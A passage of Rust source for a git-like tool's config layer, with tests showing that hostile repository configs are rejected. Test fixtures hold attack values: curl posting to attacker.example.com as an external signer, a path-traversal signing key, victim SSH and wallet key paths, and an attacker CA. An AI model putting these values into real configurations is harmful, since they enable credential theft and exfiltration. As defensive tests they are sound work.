        ("remote", "admission_headers" | "url" | "type") | ("branch", "remote" | "merge")
    ) {
        return Ok(false);
    }
    // Only flat, ref-safe names (no further dots) are accepted.
    // The grammar only: an existing config entry is never dropped for a
    // name longer than SPEC-REFS §3's bound; `remote add` checks it.
    if name.is_empty() || !kit_core::refs::validate_ref_name_grammar(name) {
        return Err(format!("invalid name `{name}` in config key `{key}`"));
    }
    let name = name.to_owned();
    match (section, field) {
        ("remote", "admission_headers") => {
            cfg.remote_admission_headers.insert(name, val.to_owned());
        }
        ("remote", "url") => val.clone_into(&mut cfg.remotes.entry(name).or_default().url),
        ("remote", "type") => {
            val.clone_into(&mut cfg.remotes.entry(name).or_default().remote_type);
        }
        ("branch", "remote") => {
            val.clone_into(&mut cfg.branch_upstreams.entry(name).or_default().remote);
        }
        _ => val.clone_into(&mut cfg.branch_upstreams.entry(name).or_default().branch),
    }
    Ok(true)
}

/// Write the given `Config` to `<root>/.kit/config`. Only repo-scoped
/// (non-forbidden) fields are emitted; security-sensitive fields live
/// in the user-scoped file and must be written there explicitly.
///
/// **Contract:** `cfg` MUST be a repo-scoped config — either
/// [`read_layered`]`(root).repo` for a read-modify-write, or a freshly
/// built [`Config`] (e.g. on `clone`). NEVER pass a merged config
/// ([`read_or_default`] / [`read_layered`]`.merged`): this serializer
/// emits repo-safe fields, so a
/// user-scoped value would be materialized into the clone-traveling
/// `.kit/config` (a privacy/scope leak). Callers that need the effective
/// (merged) value for *reads* should use it only for reads.
pub fn write(layout: &RepoLayout, cfg: &Config) -> Result<(), ConfigError> {
    let path = layout.config_file();
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    // Only repo-safe keys are emitted. Anything in `REPO_FORBIDDEN_KEYS`
    // is explicitly NOT serialised to `<repo>/.kit/config` — it lives
    // in `$XDG_CONFIG_HOME/kit/config` via `write_user_kv`. Note
    // `attest.{signer,default_algorithm}` are forbidden too because
    // they're the *selectors* that weaponise a user-scoped external
    // signer or non-Ed25519 key path against attacker-chosen content.
    let mut out = String::new();
    for (k, v) in [
        ("default_branch", cfg.default_branch.as_str()),
        ("durability.objects", cfg.durability_objects.as_str()),
        ("remote_endpoint", cfg.remote_endpoint.as_str()),
        ("remote_bucket", cfg.remote_bucket.as_str()),
        ("remote_type", cfg.remote_type.as_str()),
    ] {
        if !v.is_empty() {
            out.push_str(k);
            out.push_str(" = ");
            out.push_str(v);
            out.push('\n');
        }
    }
    // Named remotes (`remote.<name>.url` / `.type`). BTreeMap iteration
    // is sorted, so output is deterministic. `writeln!` into a `String`
    // is infallible.
    for (name, entry) in &cfg.remotes {
        if !entry.url.is_empty() {
            let _ = writeln!(out, "remote.{name}.url = {}", entry.url);
        }
        if !entry.remote_type.is_empty() {
            let _ = writeln!(out, "remote.{name}.type = {}", entry.remote_type);
        }
    }
    // Per-branch upstream tracking (`branch.<b>.remote` / `.merge`).
    for (branch, up) in &cfg.branch_upstreams {
        if !up.remote.is_empty() {
            let _ = writeln!(out, "branch.{branch}.remote = {}", up.remote);
        }
        if !up.branch.is_empty() {
            let _ = writeln!(out, "branch.{branch}.merge = {}", up.branch);
        }
    }
    // Atomic replace: write to a sibling temp file then rename over the
    // target so a crash mid-write can never leave a truncated config
    // (which would silently drop remotes / upstream tracking). The temp
    // file shares the destination directory so the rename stays on one
    // filesystem.
    let dir = path.parent().unwrap_or_else(|| Path::new("."));
    let mut tmp = tempfile::Builder::new()
        .prefix(".config.")
        .tempfile_in(dir)?;
    tmp.write_all(out.as_bytes())?;
    tmp.flush()?;
    tmp.persist(&path).map_err(|e| ConfigError::Io(e.error))?;
    Ok(())
}

pub use kit_core::{DEFAULT_BRANCH, DEFAULT_REMOTE_NAME};

/// A resolved remote: its endpoint URL plus whether the repo-scoped
/// config selected it (`repo_chosen`), which the credential gate
/// keys on. Returned by [`resolve_remote`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ResolvedRemote {
    pub name: String,
    pub endpoint: String,
    pub repo_chosen: bool,
}

/// Resolve a remote NAME to its endpoint + provenance.
///
/// - `default` (or an empty name): the flat `remote_endpoint`; chosen by
///   the repo iff the repo layer set it.
/// - any other name: a `remote.<name>.url` entry. Named remotes are
///   stored repo-scoped, so a named remote present in the repo layer is
///   `repo_chosen`; one present only in the user layer is not.
///
/// Returns `None` when the name is unknown / its URL is empty.
#[must_use]
pub fn resolve_remote(cfg: &LayeredConfig, name: &str) -> Option<ResolvedRemote> {
    let name = if name.is_empty() {
        DEFAULT_REMOTE_NAME
    } else {
        name
    };
    if name == DEFAULT_REMOTE_NAME && !cfg.merged.remote_endpoint.trim().is_empty() {
        let endpoint = cfg.merged.remote_endpoint.trim().to_owned();
        let repo_chosen = cfg.repo.remote_endpoint.trim() == endpoint;
        return Some(ResolvedRemote {
            name: DEFAULT_REMOTE_NAME.to_owned(),
            endpoint,
            repo_chosen,
        });
    }
    let entry = cfg.merged.remotes.get(name)?;
    let endpoint = entry.url.trim();
    if endpoint.is_empty() {
        return None;
    }
    let repo_chosen = cfg
        .repo
        .remotes
        .get(name)
        .is_some_and(|e| e.url.trim() == endpoint);
    Some(ResolvedRemote {
        name: name.to_owned(),
        endpoint: endpoint.to_owned(),
        repo_chosen,
    })
}

/// Every remote name resolvable via [`resolve_remote`]: the flat
/// `default` remote (when the flat `remote_endpoint` is set) plus every
/// named `remote.<name>.url` entry. Sorted and deduplicated (a
/// `BTreeSet` cannot contain a name twice), which is what makes `fetch
/// --all` / `pull --all`'s iteration order deterministic. Used by
/// `kit fetch --all` / `kit pull --all` to enumerate the remotes to
/// sync in one invocation.
#[must_use]
pub fn configured_remote_names(cfg: &LayeredConfig) -> Vec<String> {
    let mut names: std::collections::BTreeSet<String> =
        cfg.merged.remotes.keys().cloned().collect();
    if !cfg.merged.remote_endpoint.trim().is_empty() {
        names.insert(DEFAULT_REMOTE_NAME.to_owned());
    }
    names.into_iter().collect()
}

/// Resolve the upstream (remote name, remote branch) for a local branch.
/// Falls back to the `default` remote tracking the same-named branch
/// when no explicit `branch.<b>.{remote,merge}` is configured *and* a
/// default remote exists.
#[must_use]
pub fn resolve_upstream(cfg: &LayeredConfig, branch: &str) -> Option<Upstream> {
    if let Some(up) = cfg.merged.branch_upstreams.get(branch)
        && !up.remote.is_empty()
        && !up.branch.is_empty()
    {
        return Some(up.clone());
    }
    // Implicit fallback: a configured default remote tracks the
    // same-named branch. Only offered when a default endpoint exists so
    // callers can still produce an actionable "no upstream" error.
    if !cfg.merged.remote_endpoint.trim().is_empty() {
        return Some(Upstream {
            remote: DEFAULT_REMOTE_NAME.to_owned(),
            branch: branch.to_owned(),
        });
    }
    None
}

/// Write a single user-scoped key/value to the user config file of
/// `environment`.
/// Reads the existing file (if any), updates the matching line (or
/// appends), and writes back. Caller is responsible for validating
/// `value` (control bytes, key-path traversal).
pub fn write_user_kv(environment: &Environment, key: &str, value: &str) -> Result<(), ConfigError> {
    // Normalize so the written line and the case-insensitive match below use
    // git's canonical form, regardless of how the caller spelled the key.
    let key = normalize_config_key(key);
    let key = key.as_str();
    let path = user_config_path(environment)?;
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    let existing = read_config_text(&path)?.unwrap_or_default();
    let mut out = String::new();
    let mut replaced = false;
    for raw_line in existing.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            out.push_str(raw_line);
            out.push('\n');
            continue;
        }
        // Match existing lines case-insensitively (like reads), so a
        // mixed-case duplicate of the same key is updated/normalized rather
        // than left behind to shadow the canonical line. `key` is already
        // normalized by the caller.
        if let Some((k, _)) = line.split_once('=')
            && normalize_config_key(k.trim()) == key
        {
            out.push_str(key);
            out.push_str(" = ");
            out.push_str(value);
            out.push('\n');
            replaced = true;
            continue;
        }
        out.push_str(raw_line);
        out.push('\n');
    }
    if !replaced {
        out.push_str(key);
        out.push_str(" = ");
        out.push_str(value);
        out.push('\n');
    }
    // Atomic temp + fsync + rename so a crash mid-write can't leave the
    // security-sensitive user config half-written. A reader either
    // sees the old contents or the fully-updated file, never a torn one.
    write_atomic_user_config(&path, out.as_bytes())?;
    Ok(())
}

/// Remove a single user-scoped key from the user config file of `environment`,
/// mirroring [`write_user_kv`]'s read-modify-write-atomically shape but
/// dropping the matching line instead of replacing it. Returns `true`
/// iff a matching line was found and removed (a no-op unset — the key
/// was already absent — returns `false` rather than erroring, so
/// `kit config --unset` on an already-unset key is idempotent).
pub fn remove_user_kv(environment: &Environment, key: &str) -> Result<bool, ConfigError> {
    let key = normalize_config_key(key);
    let key = key.as_str();
    let path = user_config_path(environment)?;
    let Some(existing) = read_config_text(&path)? else {
        return Ok(false);
    };
    let mut out = String::new();
    let mut removed = false;
    for raw_line in existing.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            out.push_str(raw_line);
            out.push('\n');
            continue;
        }
        if let Some((k, _)) = line.split_once('=')
            && normalize_config_key(k.trim()) == key
        {
            removed = true;
            continue;
        }
        out.push_str(raw_line);
        out.push('\n');
    }
    if removed {
        write_atomic_user_config(&path, out.as_bytes())?;
    }
    Ok(removed)
}

/// Atomically write `bytes` to `path`: write into a sibling temp file,
/// fsync it, then rename over the destination. Mirrors the key-save
/// path's temp+rename hardening.
fn write_atomic_user_config(path: &Path, bytes: &[u8]) -> Result<(), ConfigError> {
    use tempfile::NamedTempFile;
    let parent = path.parent().ok_or(ConfigError::Io(io::Error::new(
        io::ErrorKind::InvalidInput,
        "user config path has no parent",
    )))?;
    let mut tmp = NamedTempFile::new_in(parent)?;
    tmp.as_file_mut().write_all(bytes)?;
    tmp.as_file_mut().sync_all()?;
    tmp.persist(path).map_err(|e| ConfigError::Io(e.error))?;
    Ok(())
}

/// Expand a user-typed `user.identity` into the canonical hex form
/// `[kind:u8][len:u16 LE][bytes]`. See `docs/CLI.md`.
pub fn expand_user_identity(value: &str) -> Result<String, ConfigError> {
    if value.is_empty() {
        return Err(ConfigError::InvalidUserIdentity("empty value"));
    }
    if let Some(hex) = value.strip_prefix("ed25519:") {
        if hex.len() != 64 {
            return Err(ConfigError::InvalidUserIdentity(
                "ed25519:<hex> must have 64 hex chars",
            ));
        }
        let bytes = from_hex_bytes(hex)
            .ok_or(ConfigError::InvalidUserIdentity("ed25519 hex is not valid"))?;
        return Ok(encode_identity_hex(0x01, &bytes));
    }
    if let Some(dec) = value.strip_prefix("mid:") {
        let mid: u64 = dec
            .parse()
            .map_err(|_| ConfigError::InvalidUserIdentity("mid must be a decimal u64"))?;
        return Ok(encode_identity_hex(0x03, &mid.to_le_bytes()));
    }
    if !value.len().is_multiple_of(2) || value.len() < 6 {
        return Err(ConfigError::InvalidUserIdentity(
            "raw hex is too short or has odd length",
        ));
    }
    let bytes = from_hex_bytes(value).ok_or(ConfigError::InvalidUserIdentity(
        "raw value is not valid hex",
    ))?;
    let declared = u16::from(bytes[1]) | (u16::from(bytes[2]) << 8);
    if bytes.len() != usize::from(declared) + 3 {
        return Err(ConfigError::InvalidUserIdentity(
            "declared length does not match payload length",
        ));
    }
    Ok(value.to_owned())
}

fn encode_identity_hex(kind: u8, bytes: &[u8]) -> String {
    let len = u16::try_from(bytes.len()).unwrap_or(u16::MAX);
    let mut buf = Vec::with_capacity(3 + bytes.len());
    buf.push(kind);
    buf.extend_from_slice(&len.to_le_bytes());
    buf.extend_from_slice(bytes);
    hex_encode(&buf)
}

fn hex_encode(bytes: &[u8]) -> String {
    static H: &[u8; 16] = b"0123456789abcdef";
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push(H[(b >> 4) as usize] as char);
        s.push(H[(b & 0x0F) as usize] as char);
    }
    s
}

/// The XDG config base for user-scoped data: `xdg_config_home` of
/// `environment`, else `<home>/.config`. The result is always an absolute
/// path, so no working directory can supply user-scoped config, trust
/// roots or grants.
///
/// # Errors
/// The XDG config directory is set but not absolute, or it is unset and the
/// home directory is unset or not absolute.
pub fn xdg_config_home(environment: &Environment) -> Result<PathBuf, String> {
    if let Some(xdg) = environment
        .xdg_config_home
        .as_deref()
        .filter(|v| !v.as_os_str().is_empty())
    {
        if xdg.is_absolute() {
            return Ok(xdg.to_path_buf());
        }
        return Err(format!(
            "XDG_CONFIG_HOME must be an absolute path, got `{}`",
            xdg.display()
        ));
    }
    if let Some(home) = environment.home.as_deref()
        && home.is_absolute()
    {
        return Ok(home.join(".config"));
    }
    Err(
        "cannot locate the user config directory: set XDG_CONFIG_HOME or HOME to an absolute path"
            .to_owned(),
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use kit_core::layout::RepoLayout;

    /// An environment with a home directory and no XDG config directory.
    fn home_env(home: &Path) -> Environment {
        Environment {
            home: Some(home.to_path_buf()),
            ..Environment::new("/work")
        }
    }

    /// Collects every event that a read reports.
    #[derive(Default)]
    struct Recorder(std::sync::Mutex<Vec<ConfigEvent>>);

    impl Observer<ConfigEvent> for Recorder {
        fn event(&self, event: &ConfigEvent) {
            self.0.lock().unwrap().push(event.clone());
        }
    }

    impl Recorder {
        fn events(&self) -> Vec<ConfigEvent> {
            self.0.lock().unwrap().clone()
        }
    }

    #[test]
    fn config_home_must_be_absolute() {
        let env = |xdg: Option<&str>, home: Option<&str>| Environment {
            xdg_config_home: xdg.map(PathBuf::from),
            home: home.map(PathBuf::from),
            ..Environment::new("/work")
        };
        assert_eq!(
            xdg_config_home(&env(Some("/x"), Some("/h"))).unwrap(),
            PathBuf::from("/x")
        );
        assert!(xdg_config_home(&env(Some("rel"), Some("/h"))).is_err());
        assert_eq!(
            xdg_config_home(&env(Some(""), Some("/h"))).unwrap(),
            PathBuf::from("/h/.config")
        );
        assert_eq!(
            xdg_config_home(&env(None, Some("/h"))).unwrap(),
            PathBuf::from("/h/.config")
        );
        for (x, h) in [
            (None, None),
            (Some(""), Some("")),
            (Some("rel"), Some("rel")),
            (None, Some("rel")),
            (Some("./"), Some("/h")),
        ] {
            assert!(xdg_config_home(&env(x, h)).is_err());
        }
    }

    use tempfile::TempDir;

    #[test]
    fn normalize_config_key_casing() {
        // Two-segment keys: section + variable both lowercased.
        assert_eq!(normalize_config_key("User.Identity"), "user.identity");
        assert_eq!(normalize_config_key("user.identity"), "user.identity");
        // Three-segment keys: section + variable lowercased, subsection kept.
        assert_eq!(
            normalize_config_key("remote.Origin.url"),
            "remote.Origin.url"
        );
        assert_eq!(
            normalize_config_key("Remote.Origin.URL"),
            "remote.Origin.url"
        );
        assert_eq!(
            normalize_config_key("branch.Release.remote"),
            "branch.Release.remote"
        );
        // 4+ segments: FIRST dot is the section, LAST dot is the variable;
        // everything between is a (case-preserved) subsection that may itself
        // contain dots — matching git (not `splitn(3)`, which would lump
        // `URL.X` into the variable).
        assert_eq!(normalize_config_key("Remote.A.B.URL"), "remote.A.B.url");
        assert_eq!(
            normalize_config_key("HTTP.https://Ex.com/.SSLVerify"),
            "http.https://Ex.com/.sslverify"
        );
        // No dot: lowercased.
        assert_eq!(normalize_config_key("Foo"), "foo");
    }

    #[test]
    fn config_file_preserves_subsection_case() {
        // A `remote.<Name>.url` written to the config file must reload with
        // the subsection case intact (git treats subsections case-sensitively),
        // so named remotes survive a round-trip.
        let dir = TempDir::new().unwrap();
        std::fs::create_dir_all(dir.path().join(".kit")).unwrap();
        std::fs::write(
            dir.path().join(".kit/config"),
            "remote.Origin.url = kit+file:///tmp/x\nremote.Origin.type = file\n",
        )
        .unwrap();
        let home = TempDir::new().unwrap();
        let cfg = read_or_default(
            &RepoLayout::single(dir.path()),
            &home_env(home.path()),
            &NoopObserver,
        )
        .unwrap();
        assert!(
            cfg.remotes.contains_key("Origin"),
            "subsection case lost on reload: {:?}",
            cfg.remotes.keys().collect::<Vec<_>>()
        );
        assert!(!cfg.remotes.contains_key("origin"));
    }

    #[test]
    fn durability_objects_key_selects_sync_policy() {
        // The SPEC-OBJECTS §10.1 escape hatch must be reachable from
        // config: `per-object` selects the strict schedule, and unset or
        // "batch" selects the batched default. Junk is a parse error.
        let mut cfg = Config::with_defaults();
        assert_eq!(cfg.object_sync_policy(), kit_core::store::SyncPolicy::Batch);
        apply_kv(&mut cfg, "durability.objects", "per-object").unwrap();
        assert_eq!(
            cfg.object_sync_policy(),
            kit_core::store::SyncPolicy::PerObject
        );
        // Round-trips through the repo-config writer.
        let dir = tempfile::tempdir().unwrap();
        write(&RepoLayout::single(dir.path()), &cfg).unwrap();
        let text = std::fs::read_to_string(dir.path().join(CONFIG_FILE)).unwrap();
        assert!(text.contains("durability.objects = per-object"));
        assert!(apply_kv(&mut cfg, "durability.objects", "bogus").is_err());
        apply_kv(&mut cfg, "durability.objects", "batch").unwrap();
        assert_eq!(cfg.object_sync_policy(), kit_core::store::SyncPolicy::Batch);
    }

    /// Tests drive `apply_file` directly on temporary files. The library
    /// reads no environment variable, so no test touches the process.
    fn layer(repo_text: Option<&str>, user_text: Option<&str>) -> Config {
        try_layer(repo_text, user_text).unwrap()
    }

    fn try_layer(repo_text: Option<&str>, user_text: Option<&str>) -> Result<Config, ConfigError> {
        let td = TempDir::new().unwrap();
        let mut cfg = Config::with_defaults();
        if let Some(text) = user_text {
            let upath = td.path().join("user_config");
            fs::write(&upath, text).unwrap();
            apply_file(&mut cfg, &upath, ConfigScope::User, &NoopObserver)?;
        }
        if let Some(text) = repo_text {
            let rpath = td.path().join("repo_config");
            fs::write(&rpath, text).unwrap();
            apply_file(&mut cfg, &rpath, ConfigScope::Repo, &NoopObserver)?;
        }
        Ok(cfg)
    }

    fn layered(repo_text: Option<&str>, user_text: Option<&str>) -> LayeredConfig {
        let td = TempDir::new().unwrap();
        let user_path = td.path().join("user_config");
        let repo_path = td.path().join("repo_config");
        if let Some(text) = user_text {
            fs::write(&user_path, text).unwrap();
        }
        if let Some(text) = repo_text {
            fs::write(&repo_path, text).unwrap();
        }
        let mut merged = Config::with_defaults();
        apply_file(&mut merged, &user_path, ConfigScope::User, &NoopObserver).unwrap();
        apply_file(&mut merged, &repo_path, ConfigScope::Repo, &NoopObserver).unwrap();
        let mut user = Config::default();
        let mut repo = Config::default();
        apply_file(&mut user, &user_path, ConfigScope::User, &NoopObserver).unwrap();
        apply_file(&mut repo, &repo_path, ConfigScope::Repo, &NoopObserver).unwrap();
        LayeredConfig { merged, user, repo }
    }

    #[test]
    fn read_default_when_missing() {
        let td = TempDir::new().unwrap();
        // No user config file under the home directory either —
        // `read_or_default` accepts that and falls through to defaults.
        let cfg = Config::with_defaults();
        assert_eq!(cfg.signing_key, DEFAULT_SIGNING_KEY);
        assert_eq!(cfg.default_branch, DEFAULT_BRANCH);
        assert!(cfg.remote_endpoint.is_empty());
        // Sanity: read_or_default on a fresh empty repo dir never
        // panics or errors.
        let home = TempDir::new().unwrap();
        let _ = read_or_default(
            &RepoLayout::single(td.path()),
            &home_env(home.path()),
            &NoopObserver,
        )
        .unwrap();
    }

    #[test]
    fn roundtrip_repo_safe_keys() {
        let cfg = layer(
            Some("remote_endpoint = /tmp/mirror\nremote_type = file\n"),
            None,
        );
        assert_eq!(cfg.remote_endpoint, "/tmp/mirror");
        assert_eq!(cfg.remote_type, "file");
    }

    #[test]
    fn write_does_not_emit_forbidden_repo_keys() {
        let td = TempDir::new().unwrap();
        fs::create_dir_all(td.path().join(".kit")).unwrap();
        let mut cfg = Config::with_defaults();
        cfg.user_identity = "01200011".into();
        cfg.signing_key = "/should/not/be/written".into();
        cfg.signer = "keystore".into();
        cfg.key.backend = "software".into();
        cfg.key.default_ref = "software:attacker".into();
        cfg.ssh_strict_host_key_checking = "no".into();
        cfg.attest.external_signer_path = "/usr/local/bin/evil".into();
        write(&RepoLayout::single(td.path()), &cfg).unwrap();
        let on_disk = fs::read_to_string(td.path().join(CONFIG_FILE)).unwrap();
        assert!(!on_disk.contains("user.identity"));
        assert!(!on_disk.contains("signing_key"));
        assert!(!on_disk.contains("signer"));
        assert!(!on_disk.contains("key.default_ref"));
        assert!(!on_disk.contains("ssh.strict_host_key_checking"));
        assert!(!on_disk.contains("external_signer_path"));
    }

    #[test]
    fn repo_signing_key_is_rejected_with_warning() {
        // Hostile-clone scenario: `.kit/config` tries to redirect the
        // signing key. After the partition fix, the value MUST NOT be
        // applied — it falls back to the built-in default.
        let cfg = layer(
            Some("signing_key = ../../../etc/passwd\nremote_type = file\n"),
            None,
        );
        assert_eq!(cfg.signing_key, DEFAULT_SIGNING_KEY);
        assert_eq!(cfg.remote_type, "file");
    }

    #[test]
    fn repo_user_identity_is_rejected() {
        let cfg = layer(Some("user.identity = 012000aaaaaaaa\n"), None);
        assert!(cfg.user_identity.is_empty());
    }

    #[test]
    fn repo_trusted_remote_endpoint_is_rejected() {
        let cfg = layer(
            Some("trusted_remote_endpoint = kit+https://attacker.invalid/repo\n"),
            None,
        );
        assert!(cfg.trusted_remote_endpoint.is_empty());
    }

    #[test]
    fn repo_external_signer_is_rejected() {
        let cfg = layer(
            Some(
                "attest.external_signer_path = /usr/bin/curl\n\
                 attest.external_signer_args = -X|POST|attacker.example.com\n\
                 attest.signer = external\n",
            ),
            None,
        );
        assert!(cfg.attest.external_signer_path.is_empty());
        assert!(cfg.attest.external_signer_args.is_empty());
        // `attest.signer` is also forbidden from per-repo: even though
        // the path itself is user-scoped, letting the per-repo file
        // SELECT the external signer is enough to weaponise a
        // user-trusted binary against attacker-chosen content. Same
        // confused-deputy shape as the C2 finding closed for
        // `signing_key`, just routed through the selector.
        assert_eq!(cfg.attest.signer, "");
    }

    /// User has set up a legitimate external HSM signer in their
    /// user-scoped config (path + args). A hostile clone ships a
    /// per-repo `attest.signer = external` to flip the selector and
    /// have the user's HSM sign the clone's commit. After this fix,
    /// the per-repo selector is dropped with a stderr warning and
    /// the user's `repo-key` default holds.
    #[test]
    fn repo_attest_signer_selector_cannot_weaponise_user_external_signer() {
        let cfg = layer(
            Some("attest.signer = external\n"),
            Some(
                "attest.external_signer_path = /home/user/bin/yubikey-sign\n\
                 attest.external_signer_args = sign\n",
            ),
        );
        // User's path stays, BUT the repo-supplied selector that
        // would route signing through that path is rejected. The
        // signer falls back to `repo-key` (the default).
        assert_eq!(
            cfg.attest.external_signer_path,
            "/home/user/bin/yubikey-sign"
        );
        assert_eq!(cfg.attest.signer, "");
        assert_eq!(cfg.attest.signer_or_fallback(), "repo-key");
    }

    /// Companion: hostile clone tries to flip
    /// `attest.default_algorithm` to whichever non-Ed25519 key the
    /// user happens to have set up, to confused-deputy through it.
    /// Selector is rejected from per-repo.
    #[test]
    fn repo_attest_default_algorithm_is_rejected() {
        let cfg = layer(Some("attest.default_algorithm = secp256k1\n"), None);
        assert_eq!(cfg.attest.default_algorithm, "");
        // Default fallback is ed25519, regardless of repo wishes.
        assert_eq!(cfg.attest.default_algorithm_or_fallback(), "ed25519");
    }

    #[test]
    fn repo_keystore_selectors_are_rejected() {
        let cfg = layer(
            Some(
                "signer = keystore\n\
                 key.backend = yubikey\n\
                 key.default_ref = yubikey:main\n\
                 key.ed25519_ref = software:repo-ed\n\
                 key.secp256k1_ref = software:repo-k1\n\
                 key.p256_ref = software:repo-p256\n",
            ),
            None,
        );
        assert_eq!(cfg.signer, DEFAULT_SIGNER);
        assert_eq!(cfg.key.backend, DEFAULT_KEY_BACKEND);
        assert_eq!(cfg.key.default_ref_or_fallback(), DEFAULT_KEY_REF);
        assert_eq!(cfg.key.ed25519_ref_or_fallback(), DEFAULT_KEY_REF);
        assert_eq!(
            cfg.key.secp256k1_ref_or_fallback(),
            DEFAULT_SECP256K1_KEY_REF
        );
        assert_eq!(cfg.key.p256_ref_or_fallback(), DEFAULT_P256_KEY_REF);
    }

    #[test]
    fn user_keystore_selectors_are_honored() {
        let cfg = layer(
            None,
            Some(
                "signer = keystore\n\
                 key.backend = software\n\
                 key.default_ref = software:user-default\n\
                 key.ed25519_ref = software:user-ed\n\
                 key.secp256k1_ref = software:user-k1\n\
                 key.p256_ref = software:user-p256\n",
            ),
        );
        assert_eq!(cfg.signer, "keystore");
        assert_eq!(cfg.key.backend, "software");
        assert_eq!(cfg.key.default_ref, "software:user-default");
        assert_eq!(cfg.key.ed25519_ref_or_fallback(), "software:user-ed");
        assert_eq!(cfg.key.secp256k1_ref_or_fallback(), "software:user-k1");
        assert_eq!(cfg.key.p256_ref_or_fallback(), "software:user-p256");
    }

    #[test]
    fn user_default_key_ref_is_generic_fallback() {
        let cfg = layer(None, Some("key.default_ref = software:release\n"));
        assert_eq!(cfg.key.default_ref_or_fallback(), "software:release");
        assert_eq!(cfg.key.ed25519_ref_or_fallback(), "software:release");
        assert_eq!(cfg.key.secp256k1_ref_or_fallback(), "software:release");
        assert_eq!(cfg.key.p256_ref_or_fallback(), "software:release");
    }

    #[test]
    fn algorithm_key_refs_override_default_key_ref() {
        let cfg = layer(
            None,
            Some(
                "key.default_ref = software:release\n\
                 key.ed25519_ref = software:ed\n\
                 key.secp256k1_ref = software:k1\n\
                 key.p256_ref = software:p256\n",
            ),
        );
        assert_eq!(cfg.key.default_ref_or_fallback(), "software:release");
        assert_eq!(cfg.key.ed25519_ref_or_fallback(), "software:ed");
        assert_eq!(cfg.key.secp256k1_ref_or_fallback(), "software:k1");
        assert_eq!(cfg.key.p256_ref_or_fallback(), "software:p256");
    }

    #[test]
    fn repo_ssh_host_key_checking_is_rejected() {
        let cfg = layer(
            Some(
                "ssh.strict_host_key_checking = no\n\
                 ssh.user_known_hosts_file = /dev/null\n",
            ),
            None,
        );
        assert!(cfg.ssh_strict_host_key_checking.is_empty());
        assert!(cfg.ssh_user_known_hosts_file.is_empty());
    }

    /// Hostile clone pins `ssh.identity_file` to a path the attacker
    /// either chose to read (any file `kit` can open under the user's
    /// uid) or chose to have signed-against (a private key the user
    /// happens to have on disk). Either way, `kit push` must NOT take
    /// the suggestion.
    #[test]
    fn repo_ssh_identity_file_is_rejected() {
        let cfg = layer(
            Some("ssh.identity_file = /home/victim/.ssh/id_ed25519\n"),
            None,
        );
        assert!(cfg.ssh_identity_file.is_empty());
    }

    #[test]
    fn repo_http_ssl_ca_info_is_rejected() {
        let cfg = layer(Some("http.sslcainfo = /tmp/attacker-ca.pem\n"), None);
        assert!(cfg.http_ssl_ca_info.is_empty());
        let cfg = layer(Some("HTTP.sslCAInfo = /tmp/attacker-ca.pem\n"), None);
        assert!(cfg.http_ssl_ca_info.is_empty());
        let cfg = layer(None, Some("http.sslcainfo = /home/me/ca.pem\n"));
        assert_eq!(cfg.http_ssl_ca_info, "/home/me/ca.pem");
    }

    /// A hostile clone must not be able to switch off
    /// post-fetch signature verification via its own repo-scoped config —
    /// that would let it silently defang the exact check meant to reject
    /// its own unsigned/forged history.
    #[test]
    fn repo_pull_require_signed_is_rejected() {
        let cfg = layer(Some("pull.require_signed = false\n"), None);
        assert!(cfg.pull_require_signed.is_empty());
        assert!(cfg.pull_require_signed_or_default());
    }

    /// User-scoped config MAY opt out (e.g. scripted/CI use against a
    /// remote the operator already trusts by other means).
    #[test]
    fn user_pull_require_signed_false_disables_verification() {
        let cfg = layer(None, Some("pull.require_signed = false\n"));
        assert_eq!(cfg.pull_require_signed, "false");
        assert!(!cfg.pull_require_signed_or_default());
    }

    /// Unset, and any value other than the documented falsy spellings,
    /// fail closed (verify).
    #[test]
    fn pull_require_signed_defaults_to_true_and_rejects_typos() {
        assert!(Config::default().pull_require_signed_or_default());
        // A typo is a load error, never a silent choice either way.
        assert!(try_layer(None, Some("pull.require_signed = nope\n")).is_err());
        assert!(try_layer(None, Some("pull.require_signd = false\n")).is_err());
        for falsy in ["false", "0", "no", "off", "FALSE", "Off"] {
            let cfg = layer(None, Some(&format!("pull.require_signed = {falsy}\n")));
            assert!(
                !cfg.pull_require_signed_or_default(),
                "{falsy} should disable verification"
            );
        }
    }

    /// Hostile clone aims `attest.secp256k1_key_path` at a key file the
    /// victim happens to own (e.g. a wallet seed). Must be ignored.
    #[test]
    fn repo_attest_secp256k1_key_path_is_rejected() {
        let cfg = layer(
            Some("attest.secp256k1_key_path = /home/victim/.wallet/seed\n"),
            None,
        );
        assert!(cfg.attest.secp256k1_key_path.is_empty());
        // Fallback default still wins.
        assert_eq!(
            cfg.attest.secp256k1_key_path_or_default(),
            ".kit/keys/secp256k1.key"
        );
    }

    /// Companion to the secp256k1 case: same shape, different curve.
    #[test]
    fn repo_attest_p256_key_path_is_rejected() {
        let cfg = layer(
            Some("attest.p256_key_path = /home/victim/.ssh/id_ecdsa\n"),
            None,
        );
        assert!(cfg.attest.p256_key_path.is_empty());
        assert_eq!(cfg.attest.p256_key_path_or_default(), ".kit/keys/p256.key");
    }

    /// Meta-test: every key listed in [`REPO_FORBIDDEN_KEYS`] MUST be
    /// covered by a per-key rejection test in this module. If you add
    /// a key to the list without a regression test, this test fails.
    ///
    /// Implemented by checking each key in isolation against `layer()`
    /// and asserting that the corresponding field on the merged
    /// `Config` is empty (i.e. the value did not propagate). Done at
    /// the `apply_kv` layer so it catches the exact code path the
    /// hostile-clone exploit uses, not just the constant itself.
    #[test]
    fn repository_cannot_select_ambient_request_signing() {
        let cfg = layer(Some("transport_auth = envelope\n"), None);
        assert!(
            !cfg.transport_auth_envelope(),
            "repo config selected an ambient signing operation"
        );
    }

    #[test]
    fn every_forbidden_key_is_actually_dropped_from_repo_scope() {
        // A sentinel value that is syntactically valid for every key
        // (no control bytes, parseable as path / argv / ref / hex). If
        // the key were accepted, it would land verbatim in the matching
        // string field — so seeing the field empty after a per-repo
        // load proves the key is being dropped.
        const SENTINEL: &str = "EXFIL_SENTINEL";

        for key in REPO_FORBIDDEN_KEYS {
            let line = format!("{key} = {SENTINEL}\n");
            let cfg = layer(Some(&line), None);
            // Look up the field through the same accessor `kit config`
            // uses, to assert the value did NOT propagate.
            let observed = match *key {
                "user.identity" => cfg.user_identity.as_str(),
